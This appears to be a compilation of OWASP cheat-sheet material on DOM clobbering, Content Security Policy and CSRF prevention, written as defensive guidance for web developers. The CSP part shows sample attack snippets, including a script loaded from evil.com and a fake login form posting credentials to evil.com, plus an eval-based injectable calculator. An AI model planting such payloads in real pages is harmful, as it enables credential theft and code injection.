Use [Object.freeze()](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/freeze#description) only as an additional control for application-owned configuration objects initialized with trusted values and retained in local scope. It prevents replacement of their own data properties, but is shallow: nested objects and values returned by getters can still change.

Do not rely on freezing `window`, `document`, or DOM elements to prevent named-property clobbering. For example, [`window` rejects attempts to prevent extensions](https://html.spec.whatwg.org/multipage/nav-history-apis.html#windowproxy-preventextensions), so `Object.freeze(window)` throws. Use [HTML sanitization](#1-html-sanitization) and [local variables](#11-limit-variables-to-local-scope) to avoid attacker-controlled named-property lookups.

### Secure Coding Guidelines

DOM Clobbering can be avoided by defensive programming and adhering to a few coding patterns and guidelines.

#### \#4: Validate All Inputs to DOM Tree

Before inserting any markup into the webpage's DOM tree, sanitize `id` and `name` attributes (see [HTML sanitization](#1-html-sanitization)).

#### \#5: Use Explicit Variable Declarations

When initializing variables, always use a variable declarator like `var`, `let` or `const`, which prevents clobbering of the variable.

**Note:** Declaring a variable with `let` does not create a property on `window`, unlike `var`. Therefore, `window.VARNAME` can still be clobbered (assuming `VARNAME` is the name of the variable).

#### \#6: Do Not Use Document and Window for Global Variables

Avoid using objects like `document` and `window` for storing global variables, because they can be easily manipulated. (see, e.g., [here](https://domclob.xyz/domc_wiki/indicators/patterns.html#do-not-use-document-for-global-variables)).

#### \#7: Do Not Trust Document Built-in APIs Before Validation

Document properties, including built-in ones, are always overshadowed by DOM Clobbering, even right after they are assigned a value.

**Hint:** This is due to the so-called [named property visibility algorithm](https://webidl.spec.whatwg.org/#legacy-platform-object-abstract-ops), where named HTML element references come before lookups of built-in APIs and other attributes on `document`.

#### \#8: Enforce Type Checking

Always check the type of `document` and `window` properties before using them in sensitive operations, e.g., using the [`instanceof`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/instanceof) operator.

**Hint:** When an object is clobbered, it would refer to an [`Element`](https://developer.mozilla.org/en-US/docs/Web/API/Element) instance, which may not be the expected type.

#### \#9: Use Strict Mode

Use `strict` mode to prevent unintended global variable creation, and to [raise an error](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Errors/Read-only) when read-only properties are attempted to be over-written.

#### \#10: Apply Browser Feature Detection

Instead of relying on browser-specific features or properties, use feature detection to determine whether a feature is supported before using it. This can help prevent errors and DOM Clobbering that might arise when using those features in unsupported browsers.

**Hint:** Unsupported feature APIs can act as an undefined variable/property in unsupported browsers, making them clobberable.

#### \#11: Limit Variables to Local Scope

Global variables are more prone to being overwritten by DOM Clobbering. Whenever possible, use local variables and object properties.

#### \#12: Use Unique Variable Names In Production

Using unique variable names may help prevent naming collisions that could lead to accidental overwrites.

#### \#13: Use Object-oriented Programming Techniques like Encapsulation

Encapsulating variables and functions within objects or classes can help prevent them from being overwritten. By making them private, they cannot be accessed from outside the object, making them less prone to DOM Clobbering.

## Content Security Policy

> **Source:** [Content Security Policy](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html) · [OWASP Cheat Sheet Series](https://github.com/OWASP/CheatSheetSeries), CC BY-SA 4.0

### Introduction

This article brings forth a way to integrate the __defense in depth__ concept to the client-side of web applications. By injecting the Content-Security-Policy (CSP) headers from the server, the browser is aware and capable of protecting the user from dynamic calls that will load content into the page currently being visited.

### Context

The increase in XSS (Cross-Site Scripting), clickjacking, and cross-site leak vulnerabilities demands a more __defense in depth__ security approach.

#### Defense against XSS

CSP defends against XSS attacks in the following ways:

##### 1. Restricting Inline Scripts

By preventing the page from executing inline scripts, attacks like injecting

```html
<script>document.body.innerHTML='defaced'</script>
```

 will not work.

##### 2. Restricting Remote Scripts

By preventing the page from loading scripts from arbitrary servers, attacks like injecting

```html
<script src="https://evil.com/hacked.js"></script>
```

will not work.

##### 3. Restricting Unsafe JavaScript

By preventing the page from executing text-to-JavaScript functions like `eval`, the website will be safe from vulnerabilities like the this:

```js
// A Simple Calculator
var op1 = getUrlParameter("op1");
var op2 = getUrlParameter("op2");
var sum = eval(`${op1} + ${op2}`);
console.log(`The sum is: ${sum}`);
```

##### 4. Restricting Form submissions

By restricting where HTML forms on your website can submit their data, injecting phishing forms won't work either.

```html
<form method="POST" action="https://evil.com/collect">
<h3>Session expired! Please login again.</h3>
<label>Username</label>
<input type="text" name="username"/>

<label>Password</label>
<input type="password" name="pass"/>

<input type="Submit" value="Login"/>
</form>
```

##### 5. Restricting Objects

And by restricting the HTML [object](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/object) tag, it also won't be possible for an attacker to inject malicious flash/Java/other legacy executables on the page.

#### Defense against framing attacks

Attacks like clickjacking and some variants of browser side-channel attacks (xs-leaks) require a malicious website to load the target website in a frame.

Historically the `X-Frame-Options` header has been used for this, but it has been obsoleted by the `frame-ancestors` CSP directive.

#### Defense in Depth

A strong CSP provides an effective __second layer__ of protection against various types of vulnerabilities, especially XSS. Although CSP doesn't prevent web applications from *containing* vulnerabilities, it can make those vulnerabilities significantly more difficult for an attacker to exploit.

Even on a fully static website, which does not accept any user input, a CSP can be used to enforce the use of [Subresource Integrity (SRI)](https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity). This can help prevent malicious code from being loaded on the website if one of the third-party sites hosting JavaScript files (such as analytics scripts) is compromised.

With all that being said, CSP __should not__ be relied upon as the only defensive mechanism against XSS. You must still follow good development practices such as the ones described in [Cross-Site Scripting Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html), and then deploy CSP on top of that as a bonus security layer.

### Policy Delivery

You can deliver a Content Security Policy to your website in three ways.

#### 1. Content-Security-Policy Header

Send a Content-Security-Policy HTTP response header from your web server.

```text
Content-Security-Policy: ...
```

Using a header is the preferred way and supports the full CSP feature set. Send it in all HTTP responses, not just the index page.

This is a W3C Spec standard header. Supported by Firefox 23+, Chrome 25+ and Opera 19+

#### 2. Content-Security-Policy-Report-Only Header

Using the `Content-Security-Policy-Report-Only`, you can deliver a CSP that doesn't get enforced.

```text
Content-Security-Policy-Report-Only: ...
```

Still, violation reports are printed to the console and delivered to a violation endpoint if the `report-to` and `report-uri` directives are used.

This is also a W3C Spec standard header. Supported by Firefox 23+, Chrome 25+ and Opera 19+, whereby the policy is non-blocking ("fail open") and a report is sent to the URL designated by the `report-uri` (or newer `report-to`) directive. This is often used as a precursor to utilizing CSP in blocking mode ("fail closed")

Browsers fully support the ability of a site to use both `Content-Security-Policy` and `Content-Security-Policy-Report-Only` together, without any issues. This pattern can be used for example to run a strict `Report-Only` policy (to get many violation reports), while having a looser enforced policy (to avoid breaking legitimate site functionality).

#### 3. Content-Security-Policy Meta Tag

Sometimes you cannot use the Content-Security-Policy header if you are, e.g., Deploying your HTML files in a CDN where the headers are out of your control.

In this case, you can still use CSP by specifying a `http-equiv` meta tag in the HTML markup, like so:

```html
<meta http-equiv="Content-Security-Policy" content="...">
```

Almost everything is still supported, including full XSS defenses. However, you will not be able to use [framing protections](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors), [sandboxing](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/sandbox), or a [CSP violation logging endpoint](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/report-to).

#### WARNING

__DO NOT__ use `X-Content-Security-Policy` or `X-WebKit-CSP`. Their implementations are obsolete (since Firefox 23, Chrome 25), limited, inconsistent, and incredibly buggy.

### CSP Types (granular/allowlist based or strict)

For original research on allowlist weaknesses, see [CSP Is Dead, Long Live CSP!](https://research.google/pubs/csp-is-dead-long-live-csp-on-the-insecurity-of-whitelists-and-the-future-of-content-security-policy/).

The original mechanism for building a CSP involved creating allow-lists which would define the content and sources that were permitted in the context of the HTML page.

However, current leading practice is to create a "Strict" CSP which is much easier to deploy and more secure as it is less likely to be bypassed.

### Strict CSP

A strict CSP can be created by using a limited number of the granular [Fetch Directives listed below](#fetch-directives) along with one of two mechanisms:

- Nonce based
- Hash based

The `strict-dynamic` directive can optionally also be used to make it easier to implement a Strict CSP.

The following sections will provide some basic guidance to these mechanisms but it is strongly recommended to follow Google's detailed and methodological instructions for creating a Strict CSP:

__[Mitigate cross-site scripting (XSS) with a strict Content Security Policy (CSP)](https://web.dev/strict-csp/)__

#### Nonce based

Nonces are unique one-time-use random values that you generate for each HTTP response, and add to the Content-Security-Policy header, like so:

```js
const nonce = uuid.v4();
scriptSrc += ` 'nonce-${nonce}'`;
```

You would then pass this nonce to your view (using nonces requires a non-static HTML) and render script tags that look something like this:

```html
<script nonce="<%= nonce %>">
    ...
</script>
```

##### Warning

__Don't__ create a middleware that replaces all script tags with "script nonce=..." because attacker-injected scripts will then get the nonces as well. You need an actual HTML templating engine to use nonces.

#### Hashes

When inline scripts are required, the `script-src 'hash_algo-hash'` is another option for allowing only specific scripts to execute.

```text
Content-Security-Policy: script-src 'sha256-V2kaaafImTjn8RQTWZmF4IfGfQ7Qsqsw9GWaFjzFNPg='
```

To get the hash, look at Google Chrome developer tools for violations like this:

> ❌ Refused to execute inline script because it violates the following Content Security Policy directive: "..." Either the 'unsafe-inline' keyword, a hash (__'sha256-V2kaaafImTjn8RQTWZmF4IfGfQ7Qsqsw9GWaFjzFNPg='__), or a nonce...

You can also use this [hash generator](https://report-uri.com/home/hash). This is a great [example](https://csp.withgoogle.com/docs/faq.html#static-content) of using hashes.

##### Note

Using hashes can be a risky approach. If you change *anything* inside the script tag (even whitespace) by, e.g., formatting your code, the hash will be different, and the script won't render.

#### strict-dynamic

The `strict-dynamic` directive can be used as part of a Strict CSP in combination with either hashes or nonces.

If a script block which has either the correct hash or nonce is creating additional DOM elements and executing JS inside of them, `strict-dynamic` tells the browser to trust those elements as well without having to explicitly add nonces or hashes for each one.

Note that while `strict-dynamic` is a CSP level 3 feature, CSP level 3 is very widely supported in common, modern browsers.

For more details, check out [strict-dynamic usage](https://w3c.github.io/webappsec-csp/#strict-dynamic-usage).

### Detailed CSP Directives

Multiple types of directives exist that allow the developer to control the flow of the policies granularly. Note that creating a non-Strict policy that is too granular or permissive is likely to lead to bypasses and a loss of protection.

#### Fetch Directives

Fetch directives tell the browser the locations to trust and load resources from.

Most fetch directives have a certain [fallback list specified in w3](https://www.w3.org/TR/CSP3/#directive-fallback-list). This list allows for granular control of the source of scripts, images, files, etc.

- `child-src` allows the developer to control nested browsing contexts and worker execution contexts.
- `connect-src` provides control over fetch requests, XHR, eventsource, beacon and websockets connections.
- `font-src` specifies which URLs to load fonts from.
- `img-src` specifies the URLs that images can be loaded from.
- `manifest-src` specifies the URLs that application manifests may be loaded from.
- `media-src` specifies the URLs from which video, audio and text track resources can be loaded from.
- `prefetch-src` was an experimental directive for prefetch/prerender resource URLs. It was __removed from the CSP Level 3 specification__ and is ignored by modern browsers — do not rely on it for defense. Constrain scripts, styles, and default fetches with the standard fetch directives instead.
- `object-src` specifies the URLs from which plugins can be loaded from.
- `script-src` specifies the locations from which a script can be executed from. It is a fallback directive for other script-like directives.
    - `script-src-elem` controls the location from which execution of script requests and blocks can occur.
    - `script-src-attr` controls the execution of event handlers.
- `style-src` controls from where styles get applied to a document. This includes `<link>` elements, `@import` rules, and requests originating from a `Link` HTTP response header field.
    - `style-src-elem` controls styles except for inline attributes.
    - `style-src-attr` controls styles attributes.
- `default-src` is a fallback directive for the other fetch directives. Directives that are specified have no inheritance, yet directives that are not specified will fall back to the value of `default-src`.

#### Document Directives

Document directives instruct the browser about the properties of the document to which the policies will apply to.

- `base-uri` specifies the possible URLs that the `<base>` element can use.
- `plugin-types` has been [removed from the CSP specification](https://bugs.webkit.org/show_bug.cgi?id=220724). Do not rely on it to enforce content types. Use `object-src 'none'` when embedded objects are unnecessary, as in the [strict policy examples](#strict-policy).
- `sandbox` restricts a page's actions such as submitting forms.
    - Only applies when used with the request header `Content-Security-Policy`.
    - Not specifying a value for the directive activates all of the sandbox restrictions. `Content-Security-Policy: sandbox;`
    - [Sandbox syntax](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/sandbox#Syntax)

#### Navigation Directives

Navigation directives instruct the browser about the locations that the document can navigate to or be embedded from.

- `form-action` restricts the URLs which the forms can submit to.
- `frame-ancestors` restricts the URLs that can embed the requested resource inside of  `<frame>`, `<iframe>`, `<object>`, `<embed>`, or `<applet>` elements.
    - If this directive is specified in a `<meta>` tag, the directive is ignored.
    - This directive doesn't fallback to the `default-src` directive.
    - `X-Frame-Options` is rendered obsolete by this directive and is ignored by the user agents.

#### Reporting Directives

Reporting directives deliver violations of prevented behaviors to specified locations. These directives serve no purpose on their own and are dependent on other directives.

- `report-to` (CSP Level 3, used together with the [Reporting API](https://developer.mozilla.org/en-US/docs/Web/API/Reporting_API)) is the __primary, current__ reporting directive. It references an endpoint name defined in the [Reporting-Endpoints response header](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Reporting-Endpoints#syntax), which uses comma-separated `name="URL"` entries. The legacy `Report-To` header uses JSON instead.
    - [MDN report-to documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/report-to)
- `report-uri` is __deprecated__ by CSP Level 3 in favor of `report-to`. It takes a URI that reports are sent to.
    - Format: `Content-Security-Policy: report-uri https://example.com/csp-reports`

For backward compatibility, declare both directives in conjunction. Browsers that support `report-to` will use it and ignore `report-uri`; older browsers fall back to `report-uri`. Once support for legacy browsers is no longer required, `report-uri` can be removed.

#### Special Directive Sources

| Value            | Description                                                                 |
|------------------|-----------------------------------------------------------------------------|
| 'none'           | No URLs match.                                                              |
| 'self'           | Refers to the origin site with the same scheme and port number.             |
| 'unsafe-inline'  | Allows the usage of inline scripts or styles.                               |
| 'unsafe-eval'    | Allows the usage of eval in scripts.                                        |

To better understand how the directive sources work, check out the [source lists from w3c](https://w3c.github.io/webappsec-csp/#framework-directive-source-list).

### CSP Sample Policies

#### Strict Policy

A strict policy's role is to protect against classical stored, reflected, and some of the DOM XSS attacks and should be the optimal goal of any team trying to implement CSP.

As noted above, Google went ahead and set up a detailed and methodological [instructions](https://web.dev/strict-csp) for creating a Strict CSP.

Based on those instructions, one of the following two policies can be used to apply a strict policy:

##### Nonce-based Strict Policy

```text
Content-Security-Policy:
  script-src 'nonce-{RANDOM}' 'strict-dynamic';
  object-src 'none';
  base-uri 'none';
```

##### Hash-based Strict Policy

```text
Content-Security-Policy:
  script-src 'sha256-{HASHED_INLINE_SCRIPT}' 'strict-dynamic';
  object-src 'none';
  base-uri 'none';
```

#### Basic non-Strict CSP Policy

This policy can be used if it is not possible to create a Strict Policy and it prevents cross-site framing and cross-site form-submissions. It will only allow resources from the originating domain for all the default level directives and will not allow inline scripts/styles to execute.

If your application functions with these restrictions, it drastically reduces your attack surface and works with most modern browsers.

The most basic policy assumes:

- All resources are hosted by the same domain of the document.
- There are no inlines or evals for scripts and style resources.
- There is no need for other websites to frame the website.
- There are no form-submissions to external websites.

```text
Content-Security-Policy: default-src 'self'; frame-ancestors 'self'; form-action 'self';
```

To tighten further, one can apply the following:

```text
Content-Security-Policy: default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self'; style-src 'self'; frame-ancestors 'self'; form-action 'self';
```

This policy allows images, scripts, AJAX, and CSS from the same origin and does not allow any other resources to load (e.g., object, frame, media, etc.).

#### Upgrading insecure requests

If the developer is migrating from HTTP to HTTPS, the following directive will ensure that all requests will be sent over HTTPS with no fallback to HTTP:

```text
Content-Security-Policy: upgrade-insecure-requests;
```

#### Preventing framing attacks (clickjacking, cross-site leaks)

- To prevent all framing of your content use:
    - `Content-Security-Policy: frame-ancestors 'none';`
- To allow for the site itself, use:
    - `Content-Security-Policy: frame-ancestors 'self';`
- To allow for trusted domain, do the following:
    - `Content-Security-Policy: frame-ancestors trusted.com;`

#### Refactoring inline code

When `default-src` or `script-src*` directives are active, CSP by default disables any JavaScript code placed inline in the HTML source, such as this:

```javascript
<script>
var foo = "314"
<script>
```

The inline code can be moved to a separate JavaScript file and the code in the page becomes:

```javascript
<script src="app.js">
</script>
```

With `app.js` containing the `var foo = "314"` code.

The inline code restriction also applies to `inline event handlers`, so that the following construct will be blocked under CSP:

```html
<button id="button1" onclick="doSomething()">
```

This should be replaced by `addEventListener` calls:

```javascript
document.getElementById("button1").addEventListener('click', doSomething);
```

## Cross-Site Request Forgery Prevention

> **Source:** [Cross-Site Request Forgery Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html) · [OWASP Cheat Sheet Series](https://github.com/OWASP/CheatSheetSeries), CC BY-SA 4.0

### Introduction

A [Cross-Site Request Forgery (CSRF)](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/05-Testing_for_Cross_Site_Request_Forgery) attack occurs when a malicious web site, email, blog, instant message, or program tricks an authenticated user's web browser into performing an unwanted action on a trusted site. If a target user is authenticated to the site, unprotected target sites cannot distinguish between legitimate authorized requests and forged authenticated requests.

Since browser requests automatically include all cookies including session cookies, this attack works unless proper authorization is used, which means that the target site's challenge-response mechanism does not verify the identity and authority of the requester. In effect, CSRF attacks make a target system perform attacker-specified functions via the victim's browser without the victim's knowledge (normally until after the unauthorized actions have been committed).

However, successful CSRF attacks can only exploit the capabilities exposed by the vulnerable application and the user's privileges. Depending on the user's credentials, the attacker can transfer funds, change a password, make an unauthorized purchase, elevate privileges for a target account, or take any action that the user is permitted to do.

In short, the following principles should be followed to defend against CSRF:

**IMPORTANT: Remember that Cross-Site Scripting (XSS) can defeat all CSRF mitigation techniques!** While Cross-Site Scripting (XSS) vulnerabilities can bypass CSRF protections, CSRF tokens are still essential for web applications that rely on cookies for authentication. Consider the client and authentication method to determine the best approach for CSRF protection in your application.

- **See the OWASP [XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html) for detailed guidance on how to prevent XSS flaws.**
- **First, check if your framework has [built-in CSRF protection](#built-in-or-existing-csrf-implementations) and use it**
- **If the framework does not have built-in CSRF protection, add [CSRF tokens](#token-based-mitigation) to all state-changing requests (requests that cause actions on the site) and validate them on the backend.**
- **If your software targets only modern browsers, you may rely on [Fetch Metadata headers](#fetch-metadata-headers) together with the fallback options described below to block cross-site state-changing requests.**
- **Stateful software should use the [synchronizer token pattern](#synchronizer-token-pattern)**
- **Stateless software should use [double submit cookies](#alternative-using-a-double-submit-cookie-pattern)**
- **If an API-driven site can't use `<form>` tags, consider [using custom request headers](#employing-custom-request-headers-for-ajaxapi)**
- **Implement at least one mitigation from [Defense in Depth Mitigations](#defense-in-depth-techniques) section**
- **[SameSite Cookie Attribute](#samesite-cookie-attribute) can be used for session cookies** but be careful to NOT set a cookie specifically for a domain. This action introduces a security vulnerability because all subdomains of that domain will share the cookie, and this is particularly an issue if a subdomain has a CNAME to domains not in your control.
- **Consider implementing [user interaction based protection](#user-interaction-based-csrf-defense) for highly sensitive operations**
- **Consider [verifying the origin with standard headers](#using-standard-headers-to-verify-origin)**
- **Do not use GET requests for state changing operations.**
- **If for any reason you do it, protect those resources against CSRF**

#### Built-In Or Existing CSRF Implementations

Before building a custom token or Fetch-Metadata implementation, check whether your framework or platform already provides CSRF protection you can use. Built-in defenses are generally preferable because they’re maintained by the framework authors and reduce the risk of subtle implementation mistakes. For example:

- .NET can use [built-in protection](https://docs.microsoft.com/en-us/aspnet/core/security/anti-request-forgery?view=aspnetcore-2.1) to add tokens to CSRF vulnerable resources. If you choose to use this protection, .NET makes you responsible for proper configuration (such as key management and token management).
- Starting from [1.25](https://pkg.go.dev/net/http@go1.25), Go developers can rely on the built-in [CrossOriginProtection](https://pkg.go.dev/net/http@go1.25#CrossOriginProtection) type. It implements a Fetch-Metadata-based CSRF defense (including validation of Sec-Fetch-Site and related headers) directly in the standard library.

### Token-Based Mitigation

The [synchronizer token pattern](#synchronizer-token-pattern) is one of the most popular and recommended methods to mitigate CSRF.

#### Synchronizer Token Pattern

CSRF tokens should be generated on the server-side and they should be generated only once per user session or each request. Because the time range for an attacker to exploit the stolen tokens is minimal for per-request tokens, they are more secure than per-session tokens. However, using per-request tokens may result in usability concerns.

For example, the "Back" button browser capability can be hindered by a per-request token as the previous page may contain a token that is no longer valid. In this case, interaction with a previous page will result in a CSRF false positive security event on the server-side. If per-session token implementations occur after the initial generation of a token, the value is stored in the session and is used for each subsequent request until the session expires.

When a client issues a request, the server-side component must verify the existence and validity of the token in that request and compare it to the token found in the user session. The request should be rejected if that token was not found within the request or the value provided does not match the value within the user session. Additional actions such as logging the event as a potential CSRF attack in progress should also be considered.

CSRF tokens should be:

- Unique per user session.
- Secret
- Unpredictable (large random value generated by a [secure method](https://cheatsheetseries.owasp.org/cheatsheets/Cryptographic_Storage_Cheat_Sheet.html#rule---use-cryptographically-secure-pseudo-random-number-generators-csprng)).

CSRF tokens prevent CSRF because without a CSRF token, an attacker cannot create valid requests to the backend server.

##### Transmitting CSRF Tokens in Synchronized Patterns

The CSRF token can be transmitted to the client as part of a response payload, such as a HTML or JSON response, then it can be transmitted back to the server as a hidden field on a form submission or via an AJAX request as a custom header value or part of a JSON payload. A CSRF token should not be transmitted in a cookie for synchronized patterns. A CSRF token must not be leaked in the server logs or in the URL. GET requests can potentially leak CSRF tokens at several locations, such as the browser history, log files, network utilities that log the first line of a HTTP request, and Referer headers if the protected site links to an external site.

For example:

```html
<form action="/transfer.do" method="post">
<input type="hidden" name="CSRFToken" value="OWY4NmQwODE4ODRjN2Q2NTlhMmZlYWEwYzU1YWQwMTVhM2JmNGYxYjJiMGI4MjJjZDE1ZDZMGYwMGEwOA==">
[...]
</form>
```

Since requests with custom headers are automatically subject to the same-origin policy, it is more secure to insert the CSRF token in a custom HTTP request header via JavaScript than adding a CSRF token in the hidden field form parameter.

#### ALTERNATIVE: Using A Double-Submit Cookie Pattern

If maintaining the state for CSRF token on the server is problematic, you can use an alternative technique known as the Double Submit Cookie pattern. This technique is easy to implement and is stateless. There are different ways to implement this technique, where the _naive_ pattern is the most commonly used variation.

##### Signed Double-Submit Cookie (RECOMMENDED)

The most secure implementation of the Double Submit Cookie pattern is the _Signed Double-Submit Cookie_, which explicitly ties tokens to the user's authenticated session (e.g., session ID). Simply signing tokens without session binding provides minimal protection and remains vulnerable to cookie injection attacks. Always bind the CSRF token explicitly to session-specific data.

If the token contains sensitive information (like session IDs or claims), always use Hash-based Message Authentication (HMAC) with a server-side secret key. This prevents token forgery while ensuring integrity. HMAC is preferred over simple hashing in all cases as it protects against various cryptographic attacks. For scenarios requiring confidentiality of token contents, use authenticated encryption instead.

###### Employing HMAC CSRF Tokens

To generate HMAC CSRF tokens (with a session-dependent user value), the system must have:

- **A session-dependent value that changes with each login session**. This value should only be valid for the entirety of the users authenticated session. Avoid using static values like the user's email or ID, as they are not secure ([1](https://stackoverflow.com/a/8656417) | [2](https://stackoverflow.com/a/30539335) | [3](https://security.stackexchange.com/a/22936)). It's worth noting that updating the CSRF token too frequently, such as for each request, is a misconception that assumes it adds substantial security while actually harming the user experience ([1](https://security.stackexchange.com/a/22936)). For example, you could choose one, or a combination, of the following session-dependent values:
    - The server-side session ID (e.g. [PHP](https://www.php.net/manual/en/function.session-start.php) or [ASP.NET](<https://learn.microsoft.com/en-us/previous-versions/aspnet/ms178581(v=vs.100)>)). This value should never leave the server or be in plain text in the CSRF Token.
    - A random value (e.g. UUID) within a JWT that changes every time a JWT is created.
- **A secret cryptographic key** Not to be confused with the random value from the naive implementation. This value is used to generate the HMAC hash. Ideally, store this key as discussed in the [Cryptographic Storage page](https://cheatsheetseries.owasp.org/cheatsheets/Cryptographic_Storage_Cheat_Sheet.html#key-storage).
- **A random value for anti-collision purposes**. Generate a random value (preferably cryptographically random) to ensure that consecutive calls within the same second do not produce the same hash ([1](https://github.com/data-govt-nz/ckanext-security/issues/23#issuecomment-479752531)).

**Should Timestamps be Included in CSRF Tokens for Expiration?**

It's a common misconception to include timestamps as a value to specify the CSRF token expiration time. A CSRF Token is not an access token. They are used to verify the authenticity of requests throughout a session, using session information. A new session should generate a new token ([1](https://stackoverflow.com/a/30539335)).

###### Pseudo-Code For Implementing HMAC CSRF Tokens

This illustrative pseudo-code uses lowercase hexadecimal strings for the random value and HMAC digest. Use the same encoding and length convention during generation and validation: [hex encoding represents each byte with two characters](https://docs.python.org/3/library/stdtypes.html#bytes.hex).

```code
// Gather the values
secret = getSecretSecurely("CSRF_SECRET") // HMAC secret key
sessionID = session.sessionID // Current authenticated user session
randomValue = cryptographic.randomValue(64).toHex() // 64 random bytes, encoded as 128 hex characters

// Create the CSRF Token
message = sessionID.length + "!" + sessionID + "!" + randomValue.length + "!" + randomValue // HMAC message payload
hmac = hmac("SHA256", secret, message) // Generate the HMAC hash
// Add the `randomValue` to the HMAC hash to create the final CSRF token.
// Avoid using the `message` because it contains the sessionID in plain text,
// which the server already stores separately.
csrfToken = hmac.toHex() + "." + randomValue

// Store the CSRF Token in a cookie
response.setCookie("csrf_token=" + csrfToken + "; Secure") // Set Cookie without HttpOnly flag
```

Before validation, reject missing tokens or tokens that do not contain exactly two lowercase hexadecimal components: a 64-character SHA-256 HMAC and the 128-character random value. Recompute the HMAC using the current authenticated session, and [compare digests in the same representation with a constant-time function](https://docs.python.org/3/library/hmac.html#hmac.compare_digest):

```code
// Get the CSRF token from the request
csrfToken = request.getParameter("csrf_token") // From header or form field (NOT cookie)

// Split the token to get the randomValue
const tokenParts = csrfToken.split(".");
const hmacFromRequest = tokenParts[0];
const randomValue = tokenParts[1];

// Recreate the HMAC with the current session and the randomValue from the request
secret = getSecretSecurely("CSRF_SECRET") // HMAC secret key
sessionID = session.sessionID // Current authenticated user session
message = sessionID.length + "!" + sessionID + "!" + randomValue.length + "!" + randomValue

// Generate the expected HMAC
expectedHmac = hmac("SHA256", secret, message).toHex()

// Compare the HMAC from the request with the expected HMAC
if (!constantTimeEquals(hmacFromRequest, expectedHmac)) {
    // HMAC validation failed, reject the request
    response.sendError(403, "Invalid CSRF token")
    logError("Invalid CSRF token") // Do not log token values
    return
}

// CSRF validation passed, continue processing the request
// ...
```

Note: The `constantTimeEquals` function should be used to compare the HMACs to prevent timing attacks. This function compares two strings in constant time, regardless of how many characters match.

#### Naive Double-Submit Cookie Pattern (DISCOURAGED)

> **Warning:**
> The Naive Double-Submit Cookie pattern is bypassable by an attacker who can write cookies on the target domain (e.g., via a vulnerable sibling subdomain, DNS takeover, or plaintext-HTTP cookie injection on a non-`__Host-` cookie). For new code, use the [Signed Double-Submit Cookie](#signed-double-submit-cookie-recommended) pattern above. The naive pattern is documented for reference only.

The _Naive Double-Submit Cookie_ method is a scalable and easy-to-implement technique which uses a cryptographically strong random value as a cookie and as a request parameter (even before user authentication). Then the server verifies if the cookie value and request value match.

The site must require that every transaction request from the user includes this random value as a **custom request header or form parameter ONLY. Cookie validation is INSECURE**.

**Why?** Browsers auto-send cookies on cross-site requests. Attackers can trigger this automatically. Security requires _explicit_ client submission (header/param) proving user intent.

If the value matches at server side, the server accepts it as a legitimate request and if they don't, it rejects the request.

Since an attacker is unable to access the cookie value during a cross-site request, they cannot include a matching value in the hidden form value or as a request parameter/header.

Though the Naive Double-Submit Cookie method is simple and scalable, it remains vulnerable to cookie injection attacks, especially when attackers control subdomains or network environments allowing them to plant or overwrite cookies. For instance, an attacker-controlled subdomain (e.g., via DNS takeover) could inject a matching cookie and thus forge a valid request token. [This resource](https://owasp.org/www-chapter-london/assets/slides/David_Johansson-Double_Defeat_of_Double-Submit_Cookie.pdf) details these vulnerabilities. Therefore, always prefer the _Signed Double-Submit Cookie_ pattern with session-bound HMAC tokens to mitigate these threats.

### Fetch Metadata headers

Fetch Metadata request headers provide extra information about the context from which an HTTP request was made. Servers can use these headers — most importantly `Sec-Fetch-Site` — as a lightweight and reliable method to block obvious cross-site requests. See the [Fetch Metadata specification](https://www.w3.org/TR/fetch-metadata/) for details.

Because some legacy browsers do not send `Sec-Fetch-*` headers, a fallback to [standard origin verification](#using-standard-headers-to-verify-origin) headers **is a mandatory requirement** for any Fetch Metadata implementation. `Sec-Fetch-*` [is supported](https://caniuse.com/mdn-http_headers_sec-fetch-site) in all major browsers since March 2023.

The Fetch Metadata request headers are:

- Sec-Fetch-Site — the primary signal for CSRF protection. It indicates the relationship between the request initiator’s origin and its target's origin: `same-origin`, `same-site`, `cross-site`, or `none`.
- Sec-Fetch-Mode, Sec-Fetch-Dest, Sec-Fetch-User — additional headers that provide context about the request (such as the request mode, destination type, or whether it was triggered by a user navigation). More details are available in the [MDN documentation](https://developer.mozilla.org/en-US/docs/Glossary/Fetch_metadata_request_header).

If any of the headers above contain values not listed in the specification, in order to support forward-compatibility, servers should ignore those headers.

#### Ease of use

Unlike [synchronizer tokens](#synchronizer-token-pattern) or [double-submit patterns](#alternative-using-a-double-submit-cookie-pattern) — which require additional client/server coordination and are difficult to implement correctly — Fetch Metadata checks are much more straightforward. They typically require only a small amount of server-side logic (inspect Sec-Fetch-Site, optionally refine with Sec-Fetch-Mode/Sec-Fetch-Dest) and no client changes. That simplicity reduces complexity, making the approach attractive for many applications.

#### Browser compatibility

Fetch Metadata request headers are supported in all modern browsers on both desktop and mobile (Chrome, Edge, Firefox, Safari 16.4+, and even in webviews on both iOS and Android), with [over 98% global coverage](https://caniuse.com/mdn-http_headers_sec-fetch-site). For compatibility detail, see the [browser support table](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Sec-Fetch-Site#browser_compatibility).

